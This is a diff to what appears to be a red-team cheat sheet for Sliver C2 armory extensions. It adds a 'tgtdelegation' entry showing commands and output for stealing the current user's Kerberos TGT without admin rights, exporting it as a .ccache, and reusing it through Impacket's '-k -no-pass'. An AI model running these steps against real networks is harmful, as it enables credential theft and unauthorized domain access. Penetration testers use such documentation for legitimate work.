@@ -66,6 +66,25 @@ Smbinfo <compuername> --> Get SMB info of remote system
 Winver --> Shows the version of Windows that is running on the local system
 ```
 
+- [**tgtdelegation**](https://github.com/sliverarmory/tgtdelegation)<br />
+Kerberos ticket delegation - Obtain usable TGTs for the current user, does not require Admin privileges!<br />
+Request TGT of active user in the current domain obtained from USERDNSDOMAIN environment variable, outputs TGT blobs to .kirbi and .ccache files<br />
+```
+tgtdelegation currentdomain default
+[+] received output:
+[+] tgtdelegation succeeded!
+
+[+] Invoking tgtParse.py to obtain a usable .ccache!
+
+[+] Successfully decrypted the AP-REQ response!
+
+[+] Local path to usable .ccache: /home/loki@MARVEL.LOCAL.ccache
+[+] Local path to usable .kirbi: /home/loki@MARVEL.LOCAL.kirbi
+```
+Now use .ccache or .kirbi files to load TGT into memory <br />
+```export KRB5CCNAME=/home/loki@MARVEL.LOCAL.ccache``` <br />
+Continue to use ticket in memory with other tooling of your choice! (i.e. Impacket's "**-k -no-pass**" command) <br />
+
 ---
 ### Executing .NET Assemblies
 
